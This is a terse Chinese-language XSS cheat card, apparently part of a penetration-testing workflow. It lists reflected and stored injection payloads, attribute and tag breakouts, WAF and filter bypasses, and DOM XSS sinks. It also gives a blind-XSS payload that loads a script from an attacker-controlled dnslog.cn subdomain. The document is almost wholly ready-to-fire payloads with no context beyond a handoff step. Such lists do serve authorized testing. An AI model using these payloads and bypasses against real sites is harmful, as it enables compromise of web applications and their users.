# XSS 秒杀卡 (≤50行)

## 反射/存储一击
```
参数值回显 → 一击:
<script>alert(1)</script>            → 原样回显 = 反射 XSS
" onmouseover="alert(1)             → 属性内闭合绕过
<img src=x onerror=alert(1)>        → 标签注入
javascript:alert(1)                 → a href / location 注入
```

## 绕过（WAF/过滤）
```
大小写: <ScRiPt> / <IMG src=x onerror=...>
事件: <svg/onload=alert(1)>
实体: &#60;script&#62;alert(1)&#60;/script&#62;
无尖括号: "onclick=alert(1)   (属性上下文)
反引号: `onmouseover=alert(1)
```

## DOM XSS
```
sink: document.write / innerHTML / location.hash
→ location.hash 可控 → fuzz
```

## 盲打（存储型无回显）
```
<script src=//<子域>.dnslog.cn></script> → dnslog.py watch
```

→ 返回 S2: {回显?, 上下文?, 可盲打?}
